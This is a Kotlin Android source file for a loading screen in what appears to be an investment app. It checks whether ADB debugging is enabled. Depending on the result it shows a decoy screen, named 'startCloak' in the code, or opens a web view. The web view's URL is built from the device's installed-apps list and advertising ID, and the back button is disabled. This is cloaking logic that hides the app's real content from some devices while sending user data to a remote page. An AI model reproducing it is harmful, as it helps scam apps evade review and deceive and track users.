package manage.invest.pre.gaz.ui.fragments

import android.app.Activity
import android.content.Context
import android.os.Bundle
import android.provider.Settings
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.activity.OnBackPressedCallback
import androidx.core.os.bundleOf
import androidx.fragment.app.Fragment
import androidx.lifecycle.lifecycleScope
import androidx.navigation.fragment.findNavController
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import manage.invest.pre.gaz.CustomApp
import manage.invest.pre.gaz.R
import manage.invest.pre.gaz.databinding.LoadingFragmentBinding
import manage.invest.pre.gaz.ui.MainActivity
import manage.invest.pre.gaz.util.AppsLoader
import manage.invest.pre.gaz.util.UriBuilder

class LoadingFragment : Fragment() {

    private var _binding: LoadingFragmentBinding? = null
    private val binding get() = _binding!!

    private lateinit var savedUrl: String
    lateinit var url: String
    private val builder = UriBuilder()

    override fun onAttach(context: Context) {
        super.onAttach(context)
        requireActivity().onBackPressedDispatcher.addCallback(
            this,
            object : OnBackPressedCallback(true) {
                override fun handleOnBackPressed() {
                }

            })
    }

    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        _binding = LoadingFragmentBinding.inflate(inflater, container, false)
        return binding.root
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        val pref = requireActivity().getSharedPreferences("pref", Context.MODE_PRIVATE)
        val appsLoader = AppsLoader(requireActivity())
        if (adbCheck(requireActivity()) != "1") {
            startCloak()
        } else {
            savedUrl = pref.getString("savedUrl", "").toString()

            if (savedUrl == "") {
                lifecycleScope.launch(Dispatchers.IO) {
                    appsLoader.getApps(requireActivity()).collect {
                        url = builder.buildUrl(it, requireActivity(), CustomApp.adId)
                        lifecycleScope.launch(Dispatchers.Main) {
                            startWEb(url)
                        }
                    }
                }
            } else {
                startWEb(savedUrl)
            }
        }
    }

    private fun startCloak() {
        findNavController().navigate(R.id.introductionFragment)
    }

    private fun startWEb(url: String) {
        val bundle = bundleOf("url" to url)
        findNavController().navigate(R.id.webFragment, bundle)
    }

    private fun adbCheck(activity: Activity): String {
        return Settings.Global.getString(activity.contentResolver, Settings.Global.ADB_ENABLED)
    }

    override fun onDestroy() {
        super.onDestroy()
        _binding = null
    }
}

